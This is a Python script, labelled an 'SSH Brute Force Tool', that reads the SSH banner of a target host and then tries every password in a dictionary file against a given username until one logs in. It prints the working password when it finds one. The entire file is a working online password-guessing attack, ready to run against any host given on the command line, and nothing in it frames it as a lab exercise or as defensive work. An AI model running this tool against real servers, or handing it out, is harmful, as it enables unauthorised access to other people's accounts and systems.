import socket
import paramiko
from pwn import *
import argparse

def get_ssh_version(ip, port=22, timeout=1):
    """ Tries to grab the SSH banner to identify the SSH version. """
    s = socket.socket()
    s.settimeout(timeout)
    try:
        s.connect((ip, port))
        banner = s.recv(100).decode()
        return banner.strip()
    except Exception as e:
        print(f"Failed to connect to {ip} on port {port}: {str(e)}")
    finally:
        s.close()

def main(host, username, password_file):
    # Display the OpenSSH version of the host
    ssh_version = get_ssh_version(host)
    if ssh_version:
        print(f"SSH Version on {host}: {ssh_version}")
    else:
        print("Unable to retrieve SSH version.")

    attempts = 0

    # Read the list of passwords
    try:
        with open(password_file, "r") as password_list:
            for password in password_list:
                password = password.strip()
                try:
                    print(f"[{attempts}] Attempting password: '{password}'!")
                    # Attempt to connect
                    response = ssh(host=host, user=username, password=password, timeout=5)
                    if response.connected():
                        print(f"[>] Valid password found: '{password}'!")
                        response.close()
                        break
                    response.close()
                except paramiko.ssh_exception.AuthenticationException:
                    print(f"[x] Invalid password!")
                except paramiko.ssh_exception.SSHException as e:
                    print(f"[!] SSH Exception: {str(e)}")
                except Exception as e:
                    print(f"[!] Unexpected error: {str(e)}")
                finally:
                    attempts += 1  # Increment the attempts after each try
    except FileNotFoundError:
        print(f"Error: The file {password_file} was not found.")
    except IOError:
        print("Error: An error occurred while reading the password file.")

    print(f"Number of attempts: {attempts}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Brute Force Tool")
    parser.add_argument("host", type=str, help="SSH host address")
    parser.add_argument("username", type=str, help="SSH username")
    parser.add_argument("password_file", type=str, help="Path to the password dictionary file")
    
    args = parser.parse_args()

    main(args.host, args.username, args.password_file)

